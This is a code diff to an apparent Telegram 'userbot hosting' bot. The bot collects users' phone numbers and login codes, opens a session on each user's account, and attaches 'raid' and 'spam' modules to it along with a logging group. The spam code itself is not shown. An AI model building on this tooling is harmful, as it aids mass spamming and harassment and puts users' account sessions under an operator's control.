@@ -32,7 +32,6 @@ async def login_handler(event):
             phone_msg = await conv.get_response()
             phone = phone_msg.text
             
-            # Initialize client
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             await client.send_code_request(phone)
@@ -56,17 +55,14 @@ async def login_handler(event):
             except Exception:
                 pass
 
-            # --- CRITICAL FIX ---
-            # We must ensure the client is fully started before registering modules
-            await client.start() 
-
-            # Register Modules
-            register_raid(client)
-            register_spam(client)
+            # --- REGISTRATION FIXED ---
+            # Now passing the 'bot' and 'LOG_GROUP' directly to avoid the import crash
+            register_raid(client, bot, LOG_GROUP)
+            register_spam(client, bot, LOG_GROUP)
             
             GLOBAL_CLIENTS[event.sender_id] = client
             
-            # Success Message
+            # --- SUCCESS MESSAGE ---
             success_msg = (
                 "❤️‍🔥 Your Userbot Is Hosted Successfully 😈\n\n"
                 "💖 Contact My Owner To Know Commands - @Divyansh6565 ♥️"
@@ -74,7 +70,6 @@ async def login_handler(event):
             await conv.send_message(success_msg)
             
         except Exception as e:
-            # This captures the error you saw in the screenshot
             await conv.send_message(f"❌ Error during login: {str(e)}")
 
 if __name__ == "__main__":
